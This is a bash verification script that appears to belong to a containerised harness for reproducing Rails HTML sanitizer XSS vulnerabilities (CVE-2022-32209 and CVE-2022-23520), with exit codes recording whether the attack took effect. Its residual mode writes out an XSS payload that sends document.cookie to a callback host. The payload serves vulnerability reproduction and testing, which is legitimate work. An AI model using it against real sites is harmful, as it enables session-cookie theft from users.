#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed: per-call :tags (CVE-2022-32209). residual: class-level allowed_tags (CVE-2022-23520).
# Judge the current RUN_FLAG in this probe's callback dump (poc_common /reset first).
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

_port_of() {
  local svc="$1" cport="$2" p="" cid=""
  case "$svc" in
    v0) p="${PORT_V0_0:-}";;
    v1) p="${PORT_V1_0:-}";;
    v2) p="${PORT_V2_0:-}";;
    victim) p="${PORT_VICTIM_0:-}";;
    callback) p="${PORT_CALLBACK_0:-}";;
  esac
  if [[ -n "$p" ]]; then
    printf '%s' "$p"
    return 0
  fi
  p="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$svc" "$cport" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -z "$p" ]]; then
    cid="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
      ps -q "$svc" 2>/dev/null | head -1)"
    if [[ -n "$cid" ]]; then
      p="$(docker port "$cid" "$cport" 2>/dev/null | head -1 | sed 's/.*://' | tr -d '[:space:]')"
    fi
  fi
  printf '%s' "$p"
}

PORT="" VPORT="" CPORT2=""
for _ in $(seq 1 60); do
  PORT="$(_port_of "$VERSION" 80)"
  VPORT="$(_port_of victim 8070)"
  CPORT2="$(_port_of callback 9000)"
  if [[ -n "$PORT" && -n "$VPORT" && -n "$CPORT2" ]] \
     && curl -fsS --max-time 3 "http://127.0.0.1:${PORT}/health" >/dev/null 2>&1 \
     && curl -fsS --max-time 3 "http://127.0.0.1:${VPORT}/health" >/dev/null 2>&1 \
     && curl -fsS --max-time 3 "http://127.0.0.1:${CPORT2}/health" >/dev/null 2>&1; then
    break
  fi
  sleep 2
done
if [[ -z "$PORT" || -z "$VPORT" || -z "$CPORT2" ]]; then
  echo "verify: no mapped ports app=${PORT:-?} victim=${VPORT:-?} callback=${CPORT2:-?}" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"
export PCB_VICTIM_PORT="$VPORT"
export PCB_CALLBACK_PORT="$CPORT2"

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'payload': s.strip(), 'san_mode': 'tags'}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
else
  # CVE-2022-23520 residual (inline, never heldout, never seed fallback):
  # SAME svg+style CDATA bytes, but class-level allowed_tags= then sanitize(html)
  # with NO :tags option. V1 (1.4.3) combination scrub is only on options[:tags].
  "$PY" - > "$WORK_DIR/cand.json" <<'PYEOF'
import json
print(json.dumps({
    "probe_id": "cve-2022-23520-class-allowed-tags",
    "payload": "<svg><style><img src=x onerror=\"document.location='//callback:9000/c?f='+document.cookie\"></style></svg>",
    "san_mode": "class",
    "mode": "load",
}))
PYEOF
fi

OUT=""
for _r in 1 2 3 4 5; do
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" && break
  sleep 10
done
[[ -n "$OUT" ]] || { echo "verify: seed_exec produced no output" >&2; exit 20; }

BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    if isinstance(d, dict):
        print(d.get('body') or d.get('dump') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
    else:
        print(d if isinstance(d, str) else json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
# Exact current RUN_FLAG only (wrong/stale must fail; do not grep leftover dumps).
if grep -qF "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
